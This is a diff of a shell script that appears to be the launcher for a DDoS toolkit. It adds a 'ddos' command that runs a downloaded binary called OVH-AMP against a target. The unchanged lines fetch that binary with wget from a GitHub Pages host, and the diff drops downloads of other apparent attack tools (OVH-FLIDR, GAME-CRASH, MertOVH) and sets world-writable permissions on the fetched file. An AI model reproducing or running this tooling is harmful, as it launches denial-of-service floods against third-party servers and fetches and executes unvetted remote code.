@@ -54,6 +54,14 @@ if [[ -f "./installed" ]]; then
         
         fi
         
+        if [ "$cmdtorun" == "ddos" ]; then
+
+            ~/root/methods/OVH-AMP $cmdtorun[1] $cmdtorun[2]
+            echo "✓ Success."
+            exit
+        
+        fi
+        
         ./libraries/proot -S . /bin/bash -c "$cmdtorun"
         runcmd
         
@@ -82,9 +90,7 @@ else
     mkdir ~/root/methods
     
     wget https://haker20szs.github.io/haker20szs/methods/OVH-AMP -O ~/root/methods/OVH-AMP 2> /dev/null
-    wget https://haker20szs.github.io/haker20szs/methods/OVH-FLIDR -O ~/root/methods/OVH-FLIDR 2> /dev/null
-    wget https://haker20szs.github.io/haker20szs/methods/GAME-CRASH -O ~/root/methods/GAME-CRASH 2> /dev/null
-    wget https://haker20szs.github.io/haker20szs/methods/MertOVH -O ~/root/methods/MertOVH 2> /dev/null
+    chmod -R 777 ~/root/methods/OVH-AMP 2> /dev/null
 
     echo "Installing modules."
 
